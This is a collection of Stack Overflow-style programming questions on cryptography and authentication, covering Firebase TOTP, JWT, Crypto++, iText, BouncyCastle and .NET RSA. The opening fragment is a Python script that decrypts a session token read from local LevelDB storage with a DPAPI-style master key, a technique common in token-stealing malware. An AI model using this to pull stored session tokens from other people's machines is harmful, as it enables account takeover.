buff = base64.b64decode(&quot;djEwe5t74Rc5Ded4Ozm++rCKmYTCd7wxI1X6L1GywnslmeUs4240q72bcuotAMSp2p3S2ovrqQoFLRNJ9GzelmF+beLrVJfPnT7cdg+7e+ZRYBfn9uiTL/4VkL8Sp24TTgoVrDA+gg==&quot;)

# Obtener la clave maestra
master_key = get_master_key()

# Desencriptar el token
token_desencriptado = decrypt_val(buff, master_key)

print(&quot;Token desencriptado:&quot;, token_desencriptado)

</code></pre>
<p>I'm getting the error:</p>
<pre><code>Traceback (most recent call last):
  File &quot;C:\Users\Oscar\OneDrive\Escritorio\read-leveldb\prube2.py&quot;, line 40, in &lt;module&gt;
    token_desencriptado = decrypt_val(buff, master_key)
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &quot;C:\Users\Oscar\OneDrive\Escritorio\read-leveldb\prube2.py&quot;, line 18, in decrypt_val
    decrypted_pass += decryptor.finalize()
                      ^^^^^^^^^^^^^^^^^^^^
  File &quot;C:\Python312\Lib\site-packages\cryptography\hazmat\primitives\ciphers\base.py&quot;, line 227, in finalize
    data = self._ctx.finalize()
           ^^^^^^^^^^^^^^^^^^^^
  File &quot;C:\Python312\Lib\site-packages\cryptography\hazmat\backends\openssl\ciphers.py&quot;, line 190, in finalize
    raise ValueError(
ValueError: Authentication tag must be provided when decrypting.
</code></pre>
<p>I've tried different ways to decrypt the token, but I can't do it. Can someone lend me a hand?</p>
<p>This suggests that the encrypted token does not contain the authentication tag required to perform the decryption operation.</p>
<p>I've added this line to fix the problem but the problem persists<code>decrypted_pass = decryptor.update(payload) + decryptor.finalize()</code></p>
<p>I have to say that I modified the token when uploading the script to the forum</p>
"
"<p>I am adding TOTP multi-factor authentication to my web app as per the <a href=""https://firebase.google.com/docs/auth/web/totp-mfa"" rel=""nofollow noreferrer"">Firebase Documentation</a> using firebase version 10.8.0.</p>
<p>More specifically, I am following the <a href=""https://firebase.google.com/docs/auth/web/totp-mfa#enroll_users_in_totp_mfa"" rel=""nofollow noreferrer"">enrollment steps</a> from the above documentation.</p>
<p>I am able to generate a TOTP secret, and using a QR code, display the secret to the user so that they can enter it into their authenticator app (Steps 1-4 in the docs).</p>
<p>Using the <code>totpSecret</code> obtained from the previous step, I then prompt the user to enter the confirmation code <code>verificationCode</code> displayed on their authenticator app, and use it to finalize MFA enrollment with the following code (Step 5  in the docs):</p>
<pre><code>    const auth = getAuth().currentUser;
    const multiFactorAssertion =
      TotpMultiFactorGenerator.assertionForEnrollment(
        totpSecret,
        verificationCode
      );

    multiFactor(user)
      .enroll(multiFactorAssertion, &quot;mfa_totp&quot;)
      .then((res) =&gt; {
         // Success
         console.log(res);
      })
      .catch((error) =&gt; {
         // Error
        console.log(error);
      });
</code></pre>
<p>Upon enrollment, the user receives the following error, which looks like it could be a bug within the package:</p>
<pre><code>TypeError: this.secret._makeTotpVerificationInfo is not a function
    at TotpMultiFactorAssertionImpl._callee97$ (index-bea2a320.js:18548:1)
    at tryCatch (regeneratorRuntime.js:45:1)
    at Generator.&lt;anonymous&gt; (regeneratorRuntime.js:133:1)
    at Generator.next (regeneratorRuntime.js:74:1)
    at asyncGeneratorStep (asyncToGenerator.js:3:1)
    at _next (asyncToGenerator.js:22:1)
    at asyncToGenerator.js:27:1
    at new Promise (&lt;anonymous&gt;)
    at TotpMultiFactorAssertionImpl.&lt;anonymous&gt; (asyncToGenerator.js:19:1)
    at TotpMultiFactorAssertionImpl._finalizeEnroll (index-bea2a320.js:18560:1)
    at TotpMultiFactorAssertionImpl._process (index-bea2a320.js:18296:1)
    at MultiFactorUserImpl._callee54$ (index-bea2a320.js:12161:1)
    at tryCatch (regeneratorRuntime.js:45:1)
    at Generator.&lt;anonymous&gt; (regeneratorRuntime.js:133:1)
    at Generator.next (regeneratorRuntime.js:74:1)
    at asyncGeneratorStep (asyncToGenerator.js:3:1)
    at _next (asyncToGenerator.js:22:1)
</code></pre>
<p>As you can see from the docs, the implementation steps are rather trivial so I suspect that the above error may be due to a bug within the package. Any assistance is appreciated!</p>
<p><strong>Updated:</strong>
The issue was that when generating the multiFactorAssertion, I was using the totpSecret.secretKey instead of the totpSecret itself.</p>
<p>Hopefully this helps someone else who runs into the same problem.</p>
"
"<p>I have a slight confusion regarding the online JWT validator <code>jwt.io</code>. As far as I understand, a JWT that is signed with the <code>RS256</code> algorithm is signed with a private key, and all is needed to verify it is the corresponding public key.</p>
<p>If so, why is it that <code>jwt.io</code> lets you fill in the private key part?</p>
<p><a href=""https://i.stack.imgur.com/bwkIJ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/bwkIJ.png"" alt=""enter image description here"" /></a></p>
"
"<p>I am trying to decrypt an encrypted file Using the Crypto++ Library. The encryption seems to work perfectly as the file that I am encrypting has Cipher text when I open it. However , just in case I will give my encryption code should it be useful.</p>
<p>Here is my Encryption Code:</p>
<pre><code>    bool Cipher::encryptFile(const char* inputFileName, const char* outputFileName)
    {

    salt = generateRandomSalt();
    generateRandomIV();

    
    if (!deriveKeyFromPassword(storedPassword, strlen(storedPassword), salt))
    {
        cerr &lt;&lt; &quot;Key derivation failed&quot; &lt;&lt; endl;
        return false;
    }

    if (iv.size() == 0 || key.size() == 0)
    {
        cerr &lt;&lt; &quot;Failed to generate IV&quot; &lt;&lt; endl;
    }

    try
    {
        ofstream outputFile(outputFileName, ios::binary | ios::trunc);
        ifstream inputFile(inputFileName, ios::binary);                                 //Input / Output files for       actual encryption
        

        if (!inputFile.is_open() || !outputFile.is_open())
        {
            cerr &lt;&lt; &quot;Error opening files&quot; &lt;&lt; endl;
            return false;
        }

        outputFile.write(reinterpret_cast&lt;const char*&gt;(salt.data()), salt.size());    //IV and salt saved to output file
        outputFile.write(reinterpret_cast&lt;const char*&gt;(iv.data()), iv.size());

        //Show Salt and IV
        cerr &lt;&lt; &quot;Read salt: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(salt.data()), salt.size(), true, new   HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        cerr &lt;&lt; &quot;Read IV: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(iv.data()), iv.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        CFB_Mode&lt;AES&gt;::Encryption encryption(key, key.size(), iv);      //Choosing CFB algorithm with iv


        StreamTransformationFilter filter(encryption, new FileSink(outputFileName));    //Data is encrypted and passed to output file

        size_t fileSize = inputFile.tellg();  // Get the size of the file and reset the position to 0
        inputFile.seekg(0);

        vector&lt;char&gt; fileBuffer(fileSize);              //Input contents of inputFile into buffer
        inputFile.read(fileBuffer.data(), fileSize);    

        filter.Put(reinterpret_cast&lt;const byte*&gt;(fileBuffer.data()), fileSize);   //Puts the fileBuffer content through the encryption filter
        filter.MessageEnd();    //Ends Processsing

        inputFile.close();
        outputFile.close();

        return true;

    }
    catch (const ifstream::failure&amp; e) {
        cerr &lt;&lt; &quot;File I/O error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
    catch (const Exception&amp; e) {
        cerr &lt;&lt; &quot;Encryption error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;

    }
}

</code></pre>
<p>The below may be useless for my problem but I will give them just in case they are useful,they are functions I used for my encryption and decryption functions(except for Constructor and Destructor)</p>
<p>This is my constructor to get the user password so that PBKDF2 can be performed during the encryption and decryption.</p>
<pre><code>Cipher::Cipher(const char* password)
{
    size_t passwordLength = strlen(password);
    storedPassword = new char[passwordLength + 1];      // Accounting for \0 char
    strcpy_s(storedPassword, passwordLength + 1 , password);    //strcpy was unsafe
}

</code></pre>
<p>This is the destructor to destroy any dangling objects and avoid memory leaks</p>
<pre><code>Cipher::~Cipher()   //Avoding memory leaks
{
    delete[] storedPassword;
    //Crypto++ manages memory interally no need to clean up objects from library
}

</code></pre>
<p>This is the function to derive the key from my given password in the constructor</p>
<pre><code>bool Cipher::deriveKeyFromPassword(const char* password, size_t passwordLength, const SecByteBlock&amp; salt)
{
    const int iterations = 10000;

    try {
        key.resize(AES::DEFAULT_KEYLENGTH);

        PKCS5_PBKDF2_HMAC&lt;SHA256&gt; PBKDF2;       //The password-based key derivation function
        PBKDF2.DeriveKey(key, key.size(), 0, reinterpret_cast&lt;const byte*&gt;(password), passwordLength, salt, salt.size(), iterations);

        //Show the derived key
        cerr &lt;&lt; &quot;Derived Key: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(key.data()), key.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        return true;
    }
    catch (const Exception e)
    {
        cerr &lt;&lt; &quot;Key Derivation error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
}

</code></pre>
<p>These are the two functions that generate a random Salt and a Random IV for random key Hashing and cipher text respectively , each time I encrypt a file</p>
<pre><code>SecByteBlock Cipher::generateRandomSalt()
{
    salt.resize(16); // 16 bytes
    prng.GenerateBlock(salt, salt.size());  //A single salt is generated(Function name may be misleading)
    cerr &lt;&lt; &quot;salt size: &quot; &lt;&lt; salt.size() &lt;&lt; endl;
    return salt;
}

bool Cipher::generateRandomIV()
{
    iv.resize(AES::BLOCKSIZE);      //128 bits(default)
    prng.GenerateBlock(iv, iv.size());      //A single iv is generated(Function name may be misleading)
    cerr &lt;&lt; &quot;IV size: &quot; &lt;&lt; iv.size() &lt;&lt; endl;
    return true;
}

</code></pre>
<p>This is the code in my main method to test encryption and decryption(by changing the cipher. each time)</p>
<pre><code>int main()
{
    const char* inputFileName = R&quot;(C:path.&lt;textfile&gt;.txt)&quot;;
    const char* otuputFileName = R&quot;(C:path.&lt;textfile&gt;.txt)&quot;;
    const char* password = &quot;test&quot;;

    Cipher cipher(password);

    if (cipher.decryptFile(inputFileName, otuputFileName))
    {
        cout &lt;&lt; &quot;Decryption successfull&quot; &lt;&lt; endl;
    }
    else
    {
        cerr &lt;&lt; &quot;Decryption failed&quot; &lt;&lt; endl;
    }

    return 0;
}
</code></pre>
<p>Basically when I try to decrypt the file, I seem to have a problem with passing the cipher text through the decrypt filter, as when I do that all the data inside of the file disappears.</p>
<p>I will give the entire decryption function just in case it is useful and then below show only the relevant snippet.</p>
<p>Decryption function:</p>
<pre><code>bool Cipher::decryptFile(const char* inputFileName, const char* outputFileName)
{
    try {
        ifstream inputFile(inputFileName, ios::binary);
        ofstream outputFile(outputFileName, ios::binary | ios::trunc);

        if (!inputFile.is_open() || !outputFile.is_open())
        {
            cerr &lt;&lt; &quot;Error opening files&quot; &lt;&lt; endl;
            return false;
        }

        salt.resize(16);
        iv.resize(16);
        inputFile.read(reinterpret_cast&lt;char*&gt;(salt.data()) , salt.size());
        inputFile.read(reinterpret_cast&lt;char*&gt;(iv.data()), iv.size());

        cerr &lt;&lt; &quot;Read salt: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(salt.data()), salt.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        cerr &lt;&lt; &quot;Read IV: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(iv.data()), iv.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        if (!deriveKeyFromPassword(storedPassword, strlen(storedPassword), salt))
        {
            cerr &lt;&lt; &quot;Key derivation failed&quot; &lt;&lt; endl;
            return false;
        }

        CFB_Mode&lt;AES&gt;::Decryption decryption(key, key.size(), iv);  //Decryption Algorithm

        StreamTransformationFilter filter(decryption, new FileSink(outputFileName));    //Decryption Filter

        //inputFile.seekg(0, ios::end);
        inputFile.seekg(salt.size() + iv.size());   //Skip salt and IV
        size_t fileSize = inputFile.tellg();    
        inputFile.seekg(0);

        vector&lt;char&gt; fileBuffer(fileSize);
        inputFile.read(fileBuffer.data(), fileSize);

        cerr &lt;&lt; &quot;size&quot; &lt;&lt; fileBuffer.size() &lt;&lt; endl;
        filter.Put(reinterpret_cast&lt;const byte*&gt;(fileBuffer.data()), fileSize);
        filter.MessageEnd();
        
        //Destory filter object
        filter.Detach(new FileSink(outputFileName));

        size_t outputSize = filter.MaxRetrievable();
        cerr &lt;&lt; &quot;size after&quot; &lt;&lt; outputSize &lt;&lt; endl;

        if (outputSize &gt; 0)
        {
            vector&lt;byte&gt; decryptedOutput(outputSize);
            filter.Get(decryptedOutput.data(), outputSize);

            // Write the decrypted data to the output file
            outputFile.write(reinterpret_cast&lt;const char*&gt;(decryptedOutput.data()), outputSize);

            cerr &lt;&lt; &quot;Data written&quot; &lt;&lt; endl;
        }
        else
        {
            cerr &lt;&lt; &quot;No data retrieved from the filter.&quot; &lt;&lt; endl;
        }

        inputFile.close();
        outputFile.close();

        return true;
    }
    catch(const ifstream::failure&amp; e)
    {
        cerr &lt;&lt; &quot;File I/O error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
    catch(const Exception&amp; e)
    {
        cerr &lt;&lt; &quot;Decryption error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
}
</code></pre>
<p>The problematic part is here:</p>
<pre><code>CFB_Mode&lt;AES&gt;::Decryption decryption(key, key.size(), iv);  //Decryption Algorithm

StreamTransformationFilter filter(decryption, new FileSink(outputFileName));    //Decryption Filter

//inputFile.seekg(0, ios::end);
inputFile.seekg(salt.size() + iv.size());   //Skip salt and IV
size_t fileSize = inputFile.tellg();    
inputFile.seekg(0);

vector&lt;char&gt; fileBuffer(fileSize);
inputFile.read(fileBuffer.data(), fileSize);

cerr &lt;&lt; &quot;size&quot; &lt;&lt; fileBuffer.size() &lt;&lt; endl;
filter.Put(reinterpret_cast&lt;const byte*&gt;(fileBuffer.data()), fileSize);
filter.MessageEnd();

//Destory filter object
filter.Detach(new FileSink(outputFileName));

size_t outputSize = filter.MaxRetrievable();
cerr &lt;&lt; &quot;size after&quot; &lt;&lt; outputSize &lt;&lt; endl;
</code></pre>
<p>I am creating a new decryption algorithm and a new decryption filter for the outputFileName FileSink.I then skip the salt and iv in my cipher text file(As due to the best of my understanding these are stored at the beginning of the file) and read the file size while also starting from position 0. The contents are now put in a new fileBuffer(which excludes the salt and IV) to which then I proceed to pass these contents through the filter.</p>
<p>Up to this point it was not working so I tried to destroy the filter object to flush anything stored inside. When I retrieve the size after I still get 0 though, thus I am still left with this problem.</p>
<pre><code>The output of putting a text file through encryption is as follows:
salt size: 16
IV size: 16
Derived Key: 4A68118A4B978617A7E38AAE2D91FDE6
Read salt: 42660BBE161C4E08E5DD4CBCC74CC952
Read IV: 7067030BACB4ED6F5AC0F1465383E46E
Encryption successful
</code></pre>
<p>The output of putting the new cipher file(from the previous text file) is as follows:</p>
<pre><code>Derived Key: 4A68118A4B978617A7E38AAE2D91FDE6
Read salt: 42660BBE161C4E08E5DD4CBCC74CC952
Read IV: 7067030BACB4ED6F5AC0F1465383E46E
size32
size after0
No data retrieved from the filter.
Decryption successfull
</code></pre>
<p>The salt , IV and derive key are all being passed correctly at first glance, also the size before is 32 and size after is 0 bits hinting that the data just vanishes? Ofcourse no data is retrieved from the filter, this was just my testing of the matter and the decryption is indeed successfull but there was nothing to decrypt? I am a bit lost at this stage</p>
"
"<p>I read a Certificate Signing Request in X.509 format. I have tried to parse it with the class X509Certificate from NodeJS 'crypto' library.
The input format is a string</p>
<pre><code>-----BEGIN CERTIFICATE REQUEST-----
MII....
-----END CERTIFICATE REQUEST-----

</code></pre>
<p>I want to get the subject from this certificate signing request (CN, emailAddress, C,...)</p>
<p>I tried the following code</p>
<pre><code>const { X509Certificate } = await import('crypto');
const x509CSR = new X509Certificate(pem)
</code></pre>
<p>But the the following error is displayed:</p>
<blockquote>
<p>error:0909006C:PEM routines:get_name:no start line</p>
</blockquote>
<p>So I have tried another library called 'node-forge'.</p>
<pre class=""lang-js prettyprint-override""><code>const { pki } = await require('node-forge');
x509CSR = pki.certificationRequestFromPem(pem);

</code></pre>
<p>But the the following error is displayed:</p>
<blockquote>
<p>Cannot read public key. OID is not RSA.</p>
</blockquote>
<p>How to get the subject data from the certificate signing request in a NodeJS server?</p>
"
"<p>I Would like to ask if there is an easy way to sign a hash using the 8.0.3 version of iText Java library. I have seen that they have recently added a high level API for pdf signatures that is PAdES-compliant but I am not sure about how I should sign hashes and keep the result separated from the respective document. This high level API that they have added introduces a class named PdfPadesSigner that is so useful to sign pdf documents but what I receive is the hash of a pdf document, not the document itself and what I have to return is the signature of the hash.</p>
<p>I need to sign hashes with the possibility to use this four conformance levels: B-B, B-T, B-LT, B-LTA. But I have not found anything on iText that allows me to do that. I don't even know how to include attributes to the signature as &quot;commitment-type-indication&quot;, &quot;content-hints&quot;, &quot;mime-type&quot;, &quot;signer-location&quot;, &quot;content-time-stamp&quot;,... Something that I also need to do.</p>
"
"<p>I am using <strong>AES-256-CFB</strong> encryption method to encrypt text but when decrypting using the same parameters it doesn't give the text I encrypted</p>
<p>Code used to encrypt</p>
<pre><code>const ss = Buffer.from(decipher.update(sender.ss, &quot;hex&quot;, &quot;hex&quot;), &quot;hex&quot;);
const iv = crypto.randomBytes(16);
const cipher = crypto.createCipheriv(process.env.encryptionMethod, ss, iv);
const encryptedMsg = cipher.update(req.body.msg, &quot;utf8&quot;, &quot;utf8&quot;) + cipher.final(&quot;utf8&quot;);
</code></pre>
<p>Code to Decrypt</p>
<pre><code>const decipherMsg = crypto.createDecipheriv(process.env.encryptionMethod, ss, Buffer.from(msg.iv, &quot;hex&quot;));
const msgText = decipherMsg.update(msg.msg.toString(&quot;utf8&quot;), &quot;utf8&quot;, &quot;utf8&quot;) + decipherMsg.final(&quot;utf8&quot;);
</code></pre>
<p>I have made sure that the key (ss) and initial vector (iv) are same in both cases. The following is an example:</p>
<ul>
<li>req.body.msg: hi</li>
<li>encryptedMsg: �D</li>
<li>Buffer of encryptedMsg: &lt;Buffer ef bf bd 44&gt;</li>
</ul>
<hr />
<ul>
<li>msg.msg: &lt;Buffer ef bf bd 44&gt;</li>
<li>msg.msg.toString(&quot;utf8&quot;): �D</li>
<li>msgText: &gt;�b�</li>
</ul>
"
"<p>I have a cloud function for delete inactive users</p>
<p>Production</p>
<pre><code>export const cleanInactiveAccount = pubsub.schedule(&quot;every 24 hours&quot;).onRun(async () =&gt; {

const usersToDelete: string[] = [];

// This solution is mixed from https://firebase.google.com/docs/auth/admin/manage-users#list_all_users
const listAllUsers = async (nextPageToken: string | undefined) =&gt; {
  // List batch of users, 1000 per batch.
  await defaultAuth
      .listUsers(1000, nextPageToken)
      .then(async (listUsersResult) =&gt; {
        listUsersResult.users.forEach((userRecord) =&gt; {
          // Since account created, If user not use their account,
          // Then add to list for delete.
          if (userRecord.metadata.lastRefreshTime == null) {
            usersToDelete.push(userRecord.uid);
          }
        });

        if (listUsersResult.pageToken) {
          // List next batch of users.
          await listAllUsers(listUsersResult.pageToken);
        } else if (usersToDelete.length &gt;= 1000) {
          console.log(&quot;usersToDelete hit the limit&quot;);
        }
      })
      .catch((error) =&gt; {
        console.log(&quot;Error listing users:&quot;, error);
      });
  };

  await listAllUsers(undefined);

  await defaultAuth.deleteUsers(usersToDelete);

  return &quot;Successful&quot;;
});
</code></pre>
<p>Testing</p>
<pre><code>test(&quot;cleanInactiveAccount&quot;, () =&gt; {
  await defaultAuth.createUser({
    // I want to do something like this.
    lastRefreshTime: new Date().getTime()
  });
  const wrapped = wrap(functions.cleanInactiveAccount);
  await expect(wrapped(data, context)).resolves.toEqual(&quot;Successful&quot;);
});
</code></pre>
<p>The value is generate by server, I can't create user with custom lastRefreshTime, I have no idea how to test it.</p>
"
"<p>Based on the posting <a href=""https://stackoverflow.com/questions/10724594/build-certificate-chain-in-bouncycastle-in-c-sharp"">Build certificate chain in BouncyCastle in C#</a> I was using the Portable.BouncyCastle (v. 1.9.0) to create a certificate chain from primary and some additional certificates in .net (core) / c# using the following static helper method - due to i now need to use the official <code>BouncyCastle.Cryptography</code> library the <code>X509CollectionStoreParameters</code> type and <code>PkixBuilderParameter.AddStore</code> method are no longer available.</p>
<p>Full method:</p>
<pre><code> static IEnumerable&lt;X509Certificate&gt; BuildCertificateChain(byte[] primary, IEnumerable&lt;byte[]&gt; additionalCertificates)
    {
        X509CertificateParser parser = new();
        PkixCertPathBuilder builder = new();
        List&lt;X509Certificate&gt; chainedCertificates = [];
        HashSet&lt;TrustAnchor&gt; trustAnchors = [];

        // Separate root and subordinate certificates
        foreach (byte[] additionalCertificateBytes in additionalCertificates)
        {
            X509Certificate parsedCertificate = parser.ReadCertificate(additionalCertificateBytes);
            // Separate root and subordinate certificates
            if (parsedCertificate.IssuerDN.Equivalent(parsedCertificate.SubjectDN)) // Root certificate
                trustAnchors.Add(new TrustAnchor(parsedCertificate, null));
            else
                chainedCertificates.Add(parsedCertificate);
        }

        // Create chain for this certificate starting with the primary certificate
        X509CertStoreSelector targetConstraintsCert = new()
        {
            Certificate = parser.ReadCertificate(primary)
        };

        chainedCertificates.Add(targetConstraintsCert.Certificate);
        PkixBuilderParameters builderParams = new(trustAnchors, targetConstraintsCert)
        {
            IsRevocationEnabled = false
        };

        X509CollectionStoreParameters intermediateStoreParameters = new(chainedCertificates);

        builderParams.AddStore(
            X509StoreFactory.Create(
                &quot;Certificate/Collection&quot;,
                intermediateStoreParameters));

        PkixCertPathBuilderResult result = builder.Build(builderParams);
        return result.CertPath.Certificates;
    }
</code></pre>
<p>Does anybody have a suggestion how to build the chain with the official libary?</p>
<p>I've tried to follow java related examples, but the related classes, types and methods are always missing. When using the following updated method, the Certificate chain is build, but all additional certificates are missing, due to i can't find a way to add them during build.</p>
<pre><code> public static IEnumerable&lt;X509Certificate&gt; BuildCertificateChain2(byte[] primary, IEnumerable&lt;byte[]&gt; additional)
    {
        X509CertificateParser parser = new X509CertificateParser();
        
        // CAN'T FIND WAY TO INCLUDE THE rest of the certificates in the chain
        List&lt;X509Certificate&gt; allCerts = new List&lt;X509Certificate&gt;();
        
        HashSet&lt;TrustAnchor&gt; trustAnchors = new HashSet&lt;TrustAnchor&gt;();

        foreach (byte[] certBytes in additional)
        {
            X509Certificate cert = parser.ReadCertificate(certBytes);
            allCerts.Add(cert);
            if (cert.IssuerDN.Equivalent(cert.SubjectDN))
            {
                trustAnchors.Add(new TrustAnchor(cert, null));
            }
        }

        X509Certificate primaryCert = parser.ReadCertificate(primary);
        allCerts.Add(primaryCert);

        // Assuming primary certificate is not a root
        X509CertStoreSelector targetConstraints = new() { Certificate = primaryCert };

        PkixBuilderParameters pkixParams = new(trustAnchors, targetConstraints)
        {
            IsRevocationEnabled = false,
        };

        PkixCertPathBuilderResult result;
        try
        {
            PkixCertPathBuilder builder = new PkixCertPathBuilder();
            result = builder.Build(pkixParams);
        }
        catch (PkixCertPathBuilderException e)
        {
            throw new Exception(&quot;Failed to build certificate path&quot;, e);
        }

        return result.CertPath.Certificates.Cast&lt;X509Certificate&gt;();
    }
</code></pre>
"
"<p>From the code below if get RSA key from Stakeholders Certificate which is the file that I load from file with a password.</p>
<p>The code below does not work in two cases the first is <code>rsaPrivateKey.ExportParameters(false)</code> the <code>privateKey!.SignHash(hash, oid)</code> gives me errors
when i set signHash using the above code i get exeception</p>
<pre class=""lang-none prettyprint-override""><code>Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddleware[1]
      An unhandled exception has occurred while executing the request.
      System.Security.Cryptography.CryptographicException: Object contains only the public half of a key pair. A private key must also be provided.
</code></pre>
<p>But if I set it to true <code>rsaPrivateKey.ExportParameters(false)</code> I get exceptions</p>
<pre class=""lang-none prettyprint-override""><code>Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddleware[1]
      An unhandled exception has occurred while executing the request.
      System.Security.Cryptography.CryptographicException: The requested operation is not supported.
         at System.Security.Cryptography.CngKey.Export(CngKeyBlobFormat format)
         at System.Security.Cryptography.RSACng.ExportParameters(Boolean includePrivateParameters)
</code></pre>
<p>How can I make it work in Windows 10 and dotnet 8 project i want to SignHash data using RSACryptoServiceProvider.</p>
<pre class=""lang-cs prettyprint-override""><code>RSA rsaPrivateKey = this.StakeHolderCert.GetRSAPrivateKey();
RSAParameters rsaParams = rsaPrivateKey.ExportParameters(true);
var privateKey = new RSACryptoServiceProvider();
privateKey.ImportParameters(rsaParams);

byte[] fullArray = privateKey!.SignHash(hash, oid);
string _base64String3 = Convert.ToBase64String(fullArray);
</code></pre>
"
"<p>I am implementing an email-first process to login to my Flutter app with Firebase Auth. For the user flow I am using a StreamBuilder that should recognize if a user is signed in or not. Depending on being signed in or not the user should be redirected appropriately. The problem is that the StreamBuilder does not navigate to the <code>HomeView()</code> after a user signed in.</p>
<p>Here is the implementation of my StreamBuilder: If the user is logged in, the app should go to the <code>HomeView()</code>, otherwise to <code>InsertEmailView()</code>. When not logged in, depending on if the inserted email is used or not, navigate to the <code>LoginView()</code> or the <code>RegisterView()</code>.<br />
So this is the wanted navigation: <code>InsertEmailView -&gt; LoginView / RegisterView -&gt; HomeView</code>.<br />
However, if a user starts in <code>LoginView()</code> (without usage of <code>InsertEmailView()</code>), the redirection to <code>HomeView()</code> works, otherwise not.</p>
<pre><code>class _WidgetTreeState extends State&lt;WidgetTree&gt;{
  @override
  Widget build(BuildContext context) {
    return StreamBuilder&lt;User?&gt;(
      stream: AuthService().authStateChanges, 
      builder: (context, snapshot){
        if (snapshot.connectionState == ConnectionState.waiting){
          return const CircularProgressIndicator();
        } else if (snapshot.hasData){
          return HomeView();
        } else {
          //return const LoginView(email: &quot;1@1.de&quot;);
          return InsertEmailView(onEmailSubmitted: (email) {
            AuthService().isEmailInUse(email).then((isEmailInUse) {
              print(isEmailInUse);
              if (isEmailInUse){
                Navigator.push(
                  context, 
                  MaterialPageRoute(
                    builder: (context) =&gt; LoginView(email: email)
                  )
                );
              } else {
                Navigator.push(
                  context, 
                  MaterialPageRoute(
                    builder: (context) =&gt; RegisterView(email: email)
                  )
                );
              }
            },);
          });
        }
      }
    );
  }
}
</code></pre>
<p>As you can see, I implemented an <code>AuthService()</code> that implements necessary Firebase Auth methods I need, and even checks if the given email is used or not (which works well).<br />
I implemented <code>authStateChanges</code> as follows:</p>
<pre><code>class AuthService with ChangeNotifier {
  final FirebaseAuth _auth = FirebaseAuth.instance;

  User? get currentUser =&gt; _auth.currentUser;

  Stream&lt;User?&gt; get authStateChanges =&gt; _auth.authStateChanges();

  Future&lt;void&gt; signInWithEmailAndPassword({
    required String email, 
    required String password
  }) async {
    await _auth.signInWithEmailAndPassword(
      email: email, 
      password: password
    );
  }
  
  Future&lt;void&gt; createUserWithEmailAndPassword({
    required String email, 
    required String password
  }) async {
    await _auth.createUserWithEmailAndPassword(
      email: email, 
      password: password
    );
  }

  Future&lt;void&gt; signOut() async {
    await _auth.signOut();
  }

  Future&lt;bool&gt; isEmailInUse(String email) async {
    try {
      List&lt;String&gt; signInMethods = await _auth.fetchSignInMethodsForEmail(email);
      return signInMethods.contains(&quot;password&quot;); // usual auth method is &quot;password&quot;
    } catch (error) {
      print('Error checking email: $error');
      return false;
    }
  }
}
</code></pre>
<p>Here you also have the implementation of <code>LoginView()</code>:</p>
<pre><code>class LoginView extends StatefulWidget {
  final String email;

  const LoginView({super.key, required this.email});

  @override
  State&lt;LoginView&gt; createState() =&gt; _LoginViewState(email: email);
}

class _LoginViewState extends State&lt;LoginView&gt; {
  String? errorMessage = '';
  String email;

  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();

  _LoginViewState({required this.email}){
    _emailController.text = email;
  }

  Future&lt;void&gt; signInWithEmailAndPassword() async {
    try {
      await AuthService().signInWithEmailAndPassword(
        email: _emailController.text, 
        password: _passwordController.text
      );
    } on FirebaseAuthException catch (e) {
      setState(() {
        errorMessage = e.message;
      });
    }
  }

  Widget _title(){
    return const Padding(
      padding: EdgeInsets.all(30.0),
      child: Text(
        &quot;Logge dich mit\nE-Mail und Passwort ein!&quot;,
        textAlign: TextAlign.center,
        style: TextStyle(
          fontSize: 20,
          fontWeight: FontWeight.bold,
        ),
      ),
    );
  } 

  Widget _entryField(
    String title,
    TextEditingController controller,
    bool obscureText
  ){
    return SizedBox(
      width: 200,
      child: TextField(
        controller: controller,
        obscureText: obscureText,
        decoration: InputDecoration(
          labelText: title,
          border: const OutlineInputBorder(),
        ),
      ),
    );
  }

  Widget _errorMessage(){
    return Text(
      errorMessage == '' ?  '' : 'Humm ? $errorMessage',
      style: const TextStyle(
        color: Colors.red
      ),
    );
  }

  Widget _signInButton(){
    return ElevatedButton(
      onPressed: () {
        signInWithEmailAndPassword();//.then((value) =&gt; {
          //Navigator.push(context, MaterialPageRoute(builder: (context) =&gt; HomeView()))
        //});
      },
      child: const Text(&quot;Anmelden&quot;),
    );
  }

  Widget _switchToRegister(){
    return ElevatedButton(
      onPressed: () {
        Navigator.push(context, MaterialPageRoute(builder: (context) =&gt; RegisterView(email: email),));
      },
      child: const Text(&quot;Doch registrieren?&quot;)
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            _title(),
            _entryField('E-Mail', _emailController, false),
            const SizedBox(height: 16),
            _entryField('Passwort', _passwordController, true),
            const SizedBox(height: 16),
            _errorMessage(),
            const SizedBox(height: 16),
            _signInButton(),
            const SizedBox(height: 16),
            _switchToRegister()
          ],
        ),
      ),
    );
  }
}
</code></pre>
<p>I can imagine that the <code>Navigator</code> breaks the snapshot implementation. I also tried implementing <code>AuthService</code> as a variable to not have multiple <code>AuthServices</code> in the <code>StreamBuilder</code> which also did not work.</p>
<p>Does anyone know how to fix my issue?</p>
"
"<p>I asked a question it is this link [How can SignHash data using RSACryptoServiceProvider in dotnet 8][1]</p>
